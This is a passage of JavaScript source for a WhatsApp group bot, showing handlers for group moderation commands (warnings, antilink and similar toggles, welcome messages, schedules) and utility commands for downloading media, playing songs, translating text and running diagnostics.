            hiddenMsg = quoted.conversation || quoted.extendedTextMessage?.text || quoted.imageMessage?.caption || quoted.videoMessage?.caption || '';
          }
        }
        
        if (!hiddenMsg) hiddenMsg = '📢'; // fallback — just tag everyone with a minimal message
        
        try {
          const meta = await sock.groupMetadata(jid);
          const participants = meta.participants?.map(p => p.id) || [];
          // Send the message with hidden mentions (no @visible tags)
          await sock.sendMessage(jid, { text: hiddenMsg, mentions: participants });
          // Delete the original command message so it looks clean
          try { await sock.sendMessage(jid, { delete: msg.key }); } catch (_) {}
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .membercount ──
      if (lower === '.membercount') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        try {
          const meta = await sock.groupMetadata(jid);
          const total = meta.participants?.length || 0;
          const admins = meta.participants?.filter(p => p.admin)?.length || 0;
          const superadmins = meta.participants?.filter(p => p.admin === 'superadmin')?.length || 0;
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ┌── *MEMBER COUNT* ──┐\n` +
            `   ╿\n` +
            `   ┝  *TOTAL*        : ${total}\n` +
            `   ┝  *ADMINS*       : ${admins}\n` +
            `   ┝  *SUPER ADMINS* : ${superadmins}\n` +
            `   ┝  *MEMBERS*      : ${total - admins}\n` +
            `   ╿\n` +
            `   └── *${meta.subject || 'GROUP'}* ──┘`
          ) }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .antilink on/off ──
      if (lower === '.antilink on' || lower === '.antilink off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const val = lower.endsWith('on');
        setGroupSetting(jid, 'antilink', val);
        await sock.sendMessage(jid, { text: `${val ? '🛡️ Antilink enabled' : '🔓 Antilink disabled'} for this group.` }, quotedOpts(msg));
        return;
      }

      // ── .antispam on/off ──
      if (lower === '.antispam on' || lower === '.antispam off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const val = lower.endsWith('on');
        setGroupSetting(jid, 'antispam', val);
        await sock.sendMessage(jid, { text: `${val ? '🛡️ Antispam enabled' : '🔓 Antispam disabled'} for this group.` }, quotedOpts(msg));
        return;
      }

      // ── .antimention on/off ──
      if (lower === '.antimention on' || lower === '.antimention off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const val = lower.endsWith('on');
        setGroupSetting(jid, 'antimention', val);
        await sock.sendMessage(jid, { text: `${val ? '🛡️ Antimention enabled' : '🔓 Antimention disabled'} for this group.` }, quotedOpts(msg));
        return;
      }

      // ── .antidelete on/off ──
      if (lower === '.antidelete on' || lower === '.antidelete off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const val = lower.endsWith('on');
        setGroupSetting(jid, 'antidelete', val);
        await sock.sendMessage(jid, { text: `${val ? '🛡️ Antidelete enabled — deleted messages will be re-sent' : '🔓 Antidelete disabled'}.` }, quotedOpts(msg));
        return;
      }

      // ── .antibot on/off ──
      if (lower === '.antibot on' || lower === '.antibot off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const val = lower.endsWith('on');
        setGroupSetting(jid, 'antibot', val);
        await sock.sendMessage(jid, { text: `${val ? '🛡️ Antibot enabled — other bots will be removed' : '🔓 Antibot disabled'}.` }, quotedOpts(msg));
        return;
      }

      // ── .antibug on/off ──
      if (lower === '.antibug on' || lower === '.antibug off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const val = lower.endsWith('on');
        setGroupSetting(jid, 'antibug', val);
        await sock.sendMessage(jid, { text: `${val ? '🛡️ Antibug enabled — crash messages will be blocked' : '🔓 Antibug disabled'}.` }, quotedOpts(msg));
        return;
      }

      // ── .warn @user ──
      if (lower === '.warn' || lower.startsWith('.warn ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        const target = resolveTargetJid(msg, text.split(/\s+/));
        if (!target) { await sock.sendMessage(jid, { text: 'Usage: .warn @user or reply to their msg' }, quotedOpts(msg)); return; }
        const count = addWarn(jid, target);
        if (count >= 3) {
          // Auto-kick on 3 warnings
          if (await isBotAdmin(sock, jid)) {
            try { await sock.groupParticipantsUpdate(jid, [target], 'remove'); } catch (_) {}
          }
          resetWarns(jid, target);
          await sock.sendMessage(jid, { text: `⚠️ @${target.split('@')[0]} reached *3 warnings* and has been removed.`, mentions: [target] }, quotedOpts(msg));
        } else {
          await sock.sendMessage(jid, { text: `⚠️ @${target.split('@')[0]} warned — *${count}/3*\n${count === 2 ? '⚠️ _Next warning = auto-kick!_' : ''}`, mentions: [target] }, quotedOpts(msg));
        }
        return;
      }

      // ── .warnlist ──
      if (lower === '.warnlist') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        loadWarnings();
        const gWarns = warningsData[jid] || {};
        const entries = Object.entries(gWarns).filter(([_, c]) => c > 0);
        if (entries.length === 0) {
          await sock.sendMessage(jid, { text: '✅ No warnings in this group.' }, quotedOpts(msg));
        } else {
          const list = entries.map(([u, c], i) => `${i + 1}. @${u.split('@')[0]} — *${c}/3*`).join('\n');
          const mentions = entries.map(([u]) => u);
          await sock.sendMessage(jid, { text: `⚠️ *Warned Users*\n━━━━━━━━━━━━━━\n${list}`, mentions }, quotedOpts(msg));
        }
        return;
      }

      // ── .resetwarn @user ──
      if (lower === '.resetwarn' || lower.startsWith('.resetwarn ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        const adminCheck = await isSenderAdmin(sock, jid, msg.key.participant || msg.key.remoteJid);
        if (!adminCheck && !senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Admin only.' }, quotedOpts(msg)); return; }
        const target = resolveTargetJid(msg, text.split(/\s+/));
        if (!target) { await sock.sendMessage(jid, { text: 'Usage: .resetwarn @user' }, quotedOpts(msg)); return; }
        resetWarns(jid, target);
        await sock.sendMessage(jid, { text: `✅ Warnings reset for @${target.split('@')[0]}.`, mentions: [target] }, quotedOpts(msg));
        return;
      }

      // ── .welcome on/off ──
      if (lower === '.welcome on' || lower === '.welcome off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const conf = getWelcomeConfig(jid);
        conf.welcome = lower.endsWith('on');
        setWelcomeConfig(jid, conf);
        await sock.sendMessage(jid, { text: conf.welcome ? '✅ Welcome messages enabled.\nUse .setwelcome <text> to customize.\nUse {user} for name, {group} for group name.' : '❌ Welcome messages disabled.' }, quotedOpts(msg));
        return;
      }

      // ── .setwelcome <text> ──
      if (lower.startsWith('.setwelcome ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const conf = getWelcomeConfig(jid);
        conf.welcomeMsg = text.slice('.setwelcome '.length).trim();
        conf.welcome = true;
        setWelcomeConfig(jid, conf);
        await sock.sendMessage(jid, { text: `✅ Welcome message set:\n\n${conf.welcomeMsg}` }, quotedOpts(msg));
        return;
      }

      // ── .goodbye on/off ──
      if (lower === '.goodbye on' || lower === '.goodbye off') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const conf = getWelcomeConfig(jid);
        conf.goodbye = lower.endsWith('on');
        setWelcomeConfig(jid, conf);
        await sock.sendMessage(jid, { text: conf.goodbye ? '✅ Goodbye messages enabled.\nUse .setgoodbye <text> to customize.' : '❌ Goodbye messages disabled.' }, quotedOpts(msg));
        return;
      }

      // ── .setgoodbye <text> ──
      if (lower.startsWith('.setgoodbye ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const conf = getWelcomeConfig(jid);
        conf.goodbyeMsg = text.slice('.setgoodbye '.length).trim();
        conf.goodbye = true;
        setWelcomeConfig(jid, conf);
        await sock.sendMessage(jid, { text: `✅ Goodbye message set:\n\n${conf.goodbyeMsg}` }, quotedOpts(msg));
        return;
      }

      // ── .schedule HH:MM <msg> ──
      if (lower.startsWith('.schedule ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const parts = text.split(/\s+/);
        const time = parts[1];
        const schedMsg = parts.slice(2).join(' ');
        if (!time || !time.includes(':') || !schedMsg) { await sock.sendMessage(jid, { text: 'Usage: .schedule HH:MM <message>\nExample: .schedule 09:00 Good morning everyone!' }, quotedOpts(msg)); return; }
        if (!scheduleData[jid]) scheduleData[jid] = {};
        scheduleData[jid][time] = schedMsg;
        saveSchedules();
        // Set up the actual timer
        const [h, m] = time.split(':').map(Number);
        const scheduleId = `${jid}_${time}`;
        if (activeSchedules[scheduleId]) clearInterval(activeSchedules[scheduleId]);
        activeSchedules[scheduleId] = setInterval(() => {
          const now = new Date();
          if (now.getHours() === h && now.getMinutes() === m) {
            sock.sendMessage(jid, { text: schedMsg }).catch(() => {});
          }
        }, 60000);
        await sock.sendMessage(jid, { text: `✅ Scheduled: *${time}* daily\n\n"${schedMsg}"` }, quotedOpts(msg));
        return;
      }

      // ── .unschedule HH:MM ──
      if (lower.startsWith('.unschedule ')) {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 Owner only.' }, quotedOpts(msg)); return; }
        const time = text.split(/\s+/)[1];
        if (!time) { await sock.sendMessage(jid, { text: 'Usage: .unschedule HH:MM' }, quotedOpts(msg)); return; }
        if (scheduleData[jid]) { delete scheduleData[jid][time]; saveSchedules(); }
        const scheduleId = `${jid}_${time}`;
        if (activeSchedules[scheduleId]) { clearInterval(activeSchedules[scheduleId]); delete activeSchedules[scheduleId]; }
        await sock.sendMessage(jid, { text: `✅ Schedule *${time}* removed.` }, quotedOpts(msg));
        return;
      }

      // ── .schedules ──
      if (lower === '.schedules') {
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ Groups only.' }, quotedOpts(msg)); return; }
        loadSchedules();
        const scheds = scheduleData[jid] || {};
        const entries = Object.entries(scheds);
        if (entries.length === 0) {
          await sock.sendMessage(jid, { text: '📭 No schedules set for this group.' }, quotedOpts(msg));
        } else {
          const list = entries.map(([t, m], i) => `${i + 1}. ⏰ *${t}* — ${m.slice(0, 50)}${m.length > 50 ? '...' : ''}`).join('\n');
          await sock.sendMessage(jid, { text: `📋 *Schedules*\n━━━━━━━━━━━━━━\n${list}` }, quotedOpts(msg));
        }
        return;
      }

      // ═══════════════════════════════════════════════════════
      // ══ UTILITY MENU COMMANDS ══════════════════════════════
      // ═══════════════════════════════════════════════════════

      // ── .dl / .yt / .ytmp3 / .tiktok / .ig / .fb / .x / .pin — Universal Downloader ──
      // Multi-tier: cobalt.tools → piped.video → ytdl-core → graceful fallback
      if (/^\.(dl|yt|ytmp3|ytaudio|tiktok|tt|ig|insta|instagram|fb|facebook|x|twitter|pin|pinterest)\s/i.test(lower)) {
        const parts = text.trim().split(/\s+/);
        const cmd = parts[0].toLowerCase().slice(1);
        const url = parts[1] || '';
        if (!url || !/^https?:\/\//i.test(url)) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: .${cmd} <url>\n\n` +
              `Supported platforms:\n` +
              `  • YouTube (.yt / .ytmp3)\n` +
              `  • TikTok (.tt / .tiktok)\n` +
              `  • Instagram (.ig / .insta)\n` +
              `  • Facebook (.fb)\n` +
              `  • X / Twitter (.x)\n` +
              `  • Pinterest (.pin)\n\n` +
              `For MP3 audio: append "mp3" or "audio"\n` +
              `Example: .ytmp3 <youtube url>`
            )
          }, quotedOpts(msg));
          return;
        }

        const persona = _ph_currentPersona(sock);
        const isAudioCmd = cmd.includes('mp3') || cmd.includes('audio') || cmd === 'ytaudio';
        const videoId = _ph_extractYouTubeId(url);
        const isYT = !!videoId;
        const domain = _ph_extractDomain(url);
        let statusMsg = null;

        try {
          statusMsg = await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, isAudioCmd ? '🎵 AUDIO FETCH' : '🎬 MEDIA FETCH',
              `┃  ⏳ *STATUS*  : Processing...\n` +
              `┃  🔗 *SOURCE*  : ${isYT ? 'YouTube' : domain}\n` +
              `┃  🎯 *TARGET*  : ${isAudioCmd ? 'Audio (MP3)' : 'Video'}\n` +
              `┃  🔄 *TIERS*    : tikwm → locoloader → local-cobalt → cobalt → piped → yt-dlp → ytdl-core`
            )
          }, quotedOpts(msg));

          // Start metadata fetch in parallel with download attempt
          const metaPromise = isYT ? _ph_getYouTubeMeta(videoId) : Promise.resolve(null);

          let mediaUrl = null;
          let mediaBuffer = null;
          let sourceUsed = null;

          // Tier 0: TIKWM (TikTok HD no-watermark, free, no key) — best for TikTok
          // From Phantom-x repo — proven to work on cloud IPs (Render, Railway, etc.)
          const platform = _ph_detectPlatform(url);
          if (platform === 'tiktok' && !mediaUrl) {
            console.log(`[dl] Tier 0: tikwm for ${url.slice(0, 60)}...`);
            const r = await _ph_tryTikwm(url);
            if (r?.url) { mediaUrl = r.url; sourceUsed = 'tikwm'; }
          }

          // Tier 1: LOCOLOADER (TikTok + Instagram fallback, free, no key)
          if (!mediaUrl && (platform === 'tiktok' || platform === 'instagram')) {
            console.log(`[dl] Tier 1: locoloader for ${url.slice(0, 60)}...`);
            const r = await _ph_tryLocoloader(url);
            if (r?.url) { mediaUrl = r.url; sourceUsed = 'locoloader'; }
          }

          // Tier 2: LOCAL COBALT (self-hosted on VPS — fastest, most reliable)
          if (!mediaUrl && COBALT_LOCAL_URL) {
            console.log(`[dl] Tier 2: local cobalt for ${url.slice(0, 60)}...`);
            mediaUrl = await _ph_tryLocalCobalt(url, isAudioCmd);
            if (mediaUrl) sourceUsed = 'local-cobalt';
          }

          // Tier 3: cobalt.tools (public instances, often blocked on cloud IPs)
          if (!mediaUrl) {
            console.log(`[dl] Tier 3: public cobalt for ${url.slice(0, 60)}...`);
            mediaUrl = await _ph_tryCobalt(url, isAudioCmd);
            if (mediaUrl) sourceUsed = 'cobalt.tools';
          }

          // Tier 4: piped.video (YouTube only)
          if (!mediaUrl && isYT) {
            console.log(`[dl] Tier 4: piped for ${videoId}`);
            mediaUrl = await _ph_tryPiped(videoId, isAudioCmd);
            if (mediaUrl) sourceUsed = 'piped.video';
          }

          // Tier 5: yt-dlp subprocess (YouTube + TikTok + IG + FB + X + Pinterest)
          // Most reliable — handles share URLs like vm.tiktok.com and youtu.be
          if (!mediaUrl) {
            console.log(`[dl] Tier 5: yt-dlp for ${url.slice(0, 60)}...`);
            mediaBuffer = await _ph_tryYtDlp(url, isAudioCmd);
            if (mediaBuffer) sourceUsed = 'yt-dlp';
          }

          // Tier 6: ytdl-core (YouTube only — legacy fallback)
          if (!mediaUrl && !mediaBuffer && isYT) {
            console.log(`[dl] Tier 6: ytdl-core for ${url.slice(0, 60)}...`);
            mediaBuffer = await _ph_tryYtdlCore(url, isAudioCmd);
            if (mediaBuffer) sourceUsed = 'ytdl-core';
          }

          // If we have a media URL, fetch the buffer
          if (!mediaBuffer && mediaUrl) {
            console.log(`[dl] Fetching buffer from ${sourceUsed}...`);
            mediaBuffer = await _ph_downloadBuffer(mediaUrl);
            if (!mediaBuffer) sourceUsed = null;
          }

          const meta = await metaPromise;

          if (mediaBuffer && mediaBuffer.length > 1000) {
            const sizeMB = (mediaBuffer.length / 1024 / 1024).toFixed(2);
            const caption = _ph_personaHeader(persona,
              isAudioCmd ? '🎵 AUDIO READY' : '🎬 MEDIA READY',
              `┃  📛 *TITLE*   : ${meta?.title || (isYT ? 'YouTube Video' : 'Media')}\n` +
              `┃  👤 *AUTHOR* : ${meta?.uploader || 'Unknown'}\n` +
              (meta?.duration ? `┃  ⏱️ *DURATION*: ${meta.duration}\n` : '') +
              `┃  📡 *SOURCE*  : ${sourceUsed}\n` +
              `┃  💾 *SIZE*    : ${sizeMB} MB`
            );

            // Edit status message to show ready metadata
            await sock.sendMessage(jid, { text: caption, edit: statusMsg.key });

            if (isAudioCmd) {
              await sock.sendMessage(jid, {
                audio: mediaBuffer,
                mimetype: 'audio/mpeg',
                fileName: `${_ph_safeFilename(meta?.title)}.mp3`
              }, quotedOpts(msg));
            } else {
              // Try as video first, fall back to document
              try {
                await sock.sendMessage(jid, {
                  video: mediaBuffer,
                  mimetype: 'video/mp4',
                  caption
                }, quotedOpts(msg));
              } catch (_) {
                await sock.sendMessage(jid, {
                  document: mediaBuffer,
                  mimetype: 'video/mp4',
                  fileName: `${_ph_safeFilename(meta?.title)}.mp4`,
                  caption
                }, quotedOpts(msg));
              }
            }
          } else {
            // All tiers failed — graceful fallback with link + thumbnail preview
            const fallbackBody =
              `┃  ❌ *STATUS*  : All sources unavailable\n` +
              `┃  🔗 *URL*     : ${url}\n` +
              (meta?.title ? `┃  📛 *TITLE*  : ${meta.title}\n` : '') +
              (meta?.uploader ? `┃  👤 *AUTHOR*: ${meta.uploader}\n` : '') +
              (meta?.duration ? `┃  ⏱️ *DURATION*: ${meta.duration}\n` : '') +
              `\n┃  💡 *TIP*     : Try again in a moment\n┃                  or open the link in\n┃                  your browser.`;
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '⚠️ DOWNLOAD UNAVAILABLE', fallbackBody),
              edit: statusMsg.key
            });
          }
        } catch (e) {
          console.error('[dl] Error:', e);
          if (statusMsg?.key) {
            await sock.sendMessage(jid, { text: buildOmegaTerminal(`❌ Download failed\n\n${e.message}`), edit: statusMsg.key });
          } else {
            await sock.sendMessage(jid, { text: buildOmegaTerminal(`❌ Download failed\n\n${e.message}`) }, quotedOpts(msg));
          }
        }
        return;
      }

      // ── .play <query> — simple website/API MP3 sender ──────────────────
      // No yt-dlp/cobalt/piped/ytdl-core tiers here. It searches YouTube,
      // asks a converter website API for a direct MP3 URL, then sends audio.
      if (/^\.play\s/i.test(lower)) {
        const query = text.slice(6).trim();
        if (!query) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: .play <song name or YouTube URL>\n\n` +
              `Examples:\n` +
              `  .play Unavailable by Davido\n` +
              `  .play https://youtu.be/dQw4w9WgXcQ`
            )
          }, quotedOpts(msg));
          return;
        }

        const persona = _ph_currentPersona(sock);
        let statusMsg = null;

        try {
          statusMsg = await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🔍 PLAY SEARCH',
              /^https?:\/\//i.test(query)
                ? `┃  🔗 *URL*    : YouTube link\n┃  ⏳ *STATUS* : Preparing audio...`
                : `┃  🔎 *QUERY*  : "${query}"\n┃  ⏳ *STATUS* : Searching YouTube...`)
          }, quotedOpts(msg));

          let video = null;
          let videoId = null;

          if (/^https?:\/\//i.test(query)) {
            videoId = _ph_extractYouTubeId(query);
            if (!videoId) {
              await sock.sendMessage(jid, {
                text: _ph_personaHeader(persona, '⚠️ INVALID URL',
                  `┃  ❌ *STATUS* : Not a YouTube URL\n┃  🔗 *INPUT*  : ${query.slice(0, 80)}${query.length > 80 ? '...' : ''}`),
                edit: statusMsg.key
              });
              return;
            }
            video = await _ph_getYouTubeMeta(videoId) || {
              title: 'YouTube Audio',
              uploader: 'Unknown',
              duration: '?',
              views: 0,
              thumbnail: null,
              url: `https://youtube.com/watch?v=${videoId}`
            };
          } else {
            const yts = require('yt-search');
            const result = await yts({ query, pageStart: 1, pageEnd: 1 });
            video = result.videos?.[0];
            if (!video) {
              await sock.sendMessage(jid, {
                text: _ph_personaHeader(persona, '❌ NO RESULTS',
                  `┃  🔎 *QUERY* : "${query}"\n┃  📭 *INFO*  : Nothing matched`),
                edit: statusMsg.key
              });
              return;
            }
            videoId = _ph_extractYouTubeId(video.url);
          }

          const meta = {
            title: video.title || 'Audio',
            uploader: video.author?.name || video.uploader || 'Unknown',
            duration: video.duration?.timestamp || video.duration || '?',
            views: video.views || 0,
            thumbnail: video.thumbnail || video.image || null,
            url: video.url || `https://youtube.com/watch?v=${videoId}`
          };

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🎵 FOUND',
              `┃  📛 *TITLE*   : ${meta.title}\n` +
              `┃  👤 *ARTIST* : ${meta.uploader}\n` +
              `┃  ⏱️ *DURATION*: ${meta.duration}\n` +
              `┃  👁️ *VIEWS*   : ${typeof meta.views === 'number' ? meta.views.toLocaleString() : meta.views}\n\n` +
              `┃  ⏳ *STATUS*  : Getting MP3 link...`),
            edit: statusMsg.key
          });

          const mp3 = await _ph_trySaveTubeMp3(meta.url, 128);
          if (!mp3?.url) {
            const fallbackUrl = `https://ytshorts.savetube.me/${videoId || ''}`;
            await sock.sendMessage(jid, {
              text: _ph_personaHeader(persona, '⚠️ PLAY FAILED',
                `┃  📛 *TITLE* : ${meta.title}\n` +
                `┃  ❌ *ERROR* : Website API could not create MP3\n\n` +
                `┃  🌐 *TRY WEBSITE*\n┃  ${fallbackUrl}\n\n` +
                `┃  ▶️ *YOUTUBE*\n┃  ${meta.url}`),
              edit: statusMsg.key
            });
            return;
          }

          const previewImage = await _ph_downloadPreviewImage(mp3.thumbnail || meta.thumbnail);

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🎵 NOW PLAYING',
              `┃  📛 *TITLE*   : ${mp3.title || meta.title}\n` +
              `┃  👤 *ARTIST* : ${meta.uploader}\n` +
              `┃  ⏱️ *DURATION*: ${meta.duration}\n` +
              `┃  🎚️ *QUALITY* : 128kbps`),
            edit: statusMsg.key
          });

          // Send as real audio. Embed the thumbnail bytes too; WhatsApp sometimes
          // shows a blank preview when only thumbnailUrl is supplied.
          await sock.sendMessage(jid, {
            audio: { url: mp3.url },
            mimetype: 'audio/mpeg',
            ptt: false,
            fileName: mp3.filename || `${_ph_safeFilename(meta.title)}.mp3`,
            jpegThumbnail: previewImage || undefined,
            contextInfo: {
              externalAdReply: {
                title: mp3.title || meta.title,
                body: meta.uploader,
                thumbnail: previewImage || undefined,
                thumbnailUrl: previewImage ? undefined : (mp3.thumbnail || meta.thumbnail),
                sourceUrl: meta.url,
                mediaType: 1,
                renderLargerThumbnail: true,
                showAdAttribution: false
              }
            }
          }, quotedOpts(msg));
        } catch (e) {
          console.error('[play] Error:', e);
          const errText = buildOmegaTerminal(`❌ Play failed\n\n${e.message}`);
          if (statusMsg?.key) {
            await sock.sendMessage(jid, { text: errText, edit: statusMsg.key });
          } else {
            await sock.sendMessage(jid, { text: errText }, quotedOpts(msg));
          }
        }
        return;
      }

      // ── .translate <lang> <text> ──
      if (lower.startsWith('.translate ')) {
        const parts = text.split(/\s+/);
        const lang = parts[1];
        const translateText = parts.slice(2).join(' ');
        if (!lang || !translateText) { await sock.sendMessage(jid, { text: 'Usage: .translate <lang code> <text>\nExample: .translate fr Hello world\n\nCodes: en, fr, es, de, ar, yo, ig, ha, zh, ja, ko, pt, ru, hi' }, quotedOpts(msg)); return; }
        try {
          const https = require('https');
          const encoded = encodeURIComponent(translateText);
          const transUrl = `https://api.mymemory.translated.net/get?q=${encoded}&langpair=auto|${lang}`;
          const result = await new Promise((resolve, reject) => {
            https.get(transUrl, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch { reject(new Error('Bad response')); } }); }).on('error', reject);
          });
          const translated = result?.responseData?.translatedText || 'Translation failed';
          await sock.sendMessage(jid, { text: `🌐 *Translation* (→ ${lang})\n\n${translated}` }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .diagnose ── Check downloader subsystem health (yt-dlp + ffmpeg)
      // Useful for verifying Render deployment is configured correctly
      if (lower === '.diagnose' || lower.startsWith('.diagnose')) {
        const persona = _ph_currentPersona(sock);
        try {
          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona, '🔧 DIAGNOSTICS',
              `┃  ⏳ *STATUS* : Checking downloader setup...\n\n` +
              `┃  🔍 Testing yt-dlp...\n` +
              `┃  🔍 Testing ffmpeg...\n` +
              `┃  🔍 Testing live download...`)
          }, quotedOpts(msg));

          const diag = await _ph_diagnoseDownloader();

          let body = '';
          if (diag.ytDlp) {
            body += `┃  ✅ *yt-dlp*     : ${diag.ytDlp}\n`;
          } else {
            body += `┃  ❌ *yt-dlp*     : NOT INSTALLED\n` +
                    `┃       → Render buildCommand should include:\n` +
                    `┃         pip install yt-dlp imageio-ffmpeg bgutil-ytdlp-pot-provider\n`;
          }
          if (diag.ffmpeg) {
            body += `┃  ✅ *ffmpeg*    : ${diag.ffmpeg}\n`;
          } else {
            body += `┃  ⚠️ *ffmpeg*    : not found (will use m4a fallback)\n` +
                    `┃       → Install via:\n` +
                    `┃         pip install imageio-ffmpeg\n`;
          }

          // Live test — try downloading a tiny audio clip
          body += `\n┃  🧪 *LIVE TEST*  :\n`;
          try {
            const testUrl = 'https://www.youtube.com/watch?v=jNQXAC9IVRw'; // "Me at the zoo" — 19s, very stable test video
            const startTime = Date.now();
            const buf = await _ph_tryYtDlp(testUrl, true);
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            if (buf && buf.length > 100) {
              body += `┃  ✅ *yt-dlp*     : LIVE DOWNLOAD OK\n`;
              body += `┃      → ${(buf.length/1024).toFixed(1)}KB in ${elapsed}s\n`;
              body += `┃      → .play should WORK\n`;
            } else {
              body += `┃  ❌ *yt-dlp*     : live download failed (${elapsed}s)\n`;
              body += `┃      → .play will fall back to link\n`;
              body += `┃      → Check Render logs for [dl] errors\n`;
            }
          } catch (e) {
            body += `┃  ❌ *yt-dlp*     : live test threw: ${e.message?.slice(0, 80)}\n`;
          }

          body += `\n┃  📋 *TIER CHAIN* :\n` +
                  `┃     1. cobalt.tools (3 instances)\n` +
                  `┃     2. piped.video API (4 instances, YouTube)\n` +
                  `┃     3. yt-dlp subprocess (5 player clients)\n` +
                  `┃     4. ytdl-core (legacy, YouTube)\n` +
                  `┃     5. graceful link fallback\n`;

          await sock.sendMessage(jid, {
            text: _ph_personaHeader(persona,
              (diag.ytDlp && diag.ffmpeg) ? '✅ ALL GOOD' : '⚠️ ISSUES FOUND',
              body)
          }, quotedOpts(msg));
        } catch (e) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(`❌ Diagnose failed\n\n${e.message}`)
          }, quotedOpts(msg));
        }
        return;
      }

      // ── .weather <location> — geocode + weather with full address support ──
      // Geocoding: Google Maps (if GOOGLE_MAPS_API_KEY env var set) → Nominatim fallback
      // Weather: Open-Meteo (free, no key, takes lat/lng)
      // Supports: city, city+state+country, street names, full addresses, lat,lng coords
      if (lower.startsWith('.weather') && (lower === '.weather' || lower.startsWith('.weather '))) {
        const location = lower === '.weather' ? '' : text.slice('.weather '.length).trim();
        if (!location) {
          await sock.sendMessage(jid, {
            text: buildOmegaTerminal(
              `Usage: .weather <location>\n\n` +
              `Examples:\n` +
              `  .weather Ikeja Lagos Nigeria\n` +
              `  .weather Faitai Fagbenro Meiran Lagos\n` +
              `  .weather New York, USA\n` +
              `  .weather London UK\n` +
              `  .weather 6.5244,3.3792  (lat,lng)`
            )
          }, quotedOpts(msg));
          return;
        }

        const persona = _ph_currentPersona(sock);

        try {
          // Step 1: Resolve coordinates
          let geo = null;
          const coordMatch = location.match(/^(-?\d+(?:\.\d+)?)[,\s]+(-?\d+(?:\.\d+)?)$/);
          if (coordMatch) {
            geo = {
              lat: parseFloat(coordMatch[1]),
              lng: parseFloat(coordMatch[2]),
